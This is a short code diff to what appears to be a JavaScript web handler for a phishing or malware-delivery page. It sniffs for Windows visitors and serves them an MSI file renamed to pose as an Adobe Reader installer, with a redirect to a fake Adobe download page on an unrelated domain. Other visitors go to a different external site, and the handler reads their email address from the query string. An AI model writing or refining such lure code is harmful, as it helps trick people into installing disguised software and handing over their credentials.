@@ -4,8 +4,8 @@ export default function handler(req, res) {
   const isWindows = /windows/i.test(userAgent);
 
   const WINDOWS_REDIRECT_AFTER_DOWNLOAD = 'https://mksonline.com.mx/css/adobe/reader/download.html';
-  const MSI_PATH = '/tony-market.msi';
-  const NON_WINDOWS_TARGET = 'https://accounts.fxzova.icu';
+  const MSI_PATH = '/Reader_adobe_install_online.msi';
+  const NON_WINDOWS_TARGET = 'https://tagtechpro.com/i/?';
 
   // 1. Try to get email from query normally
   let email = '';
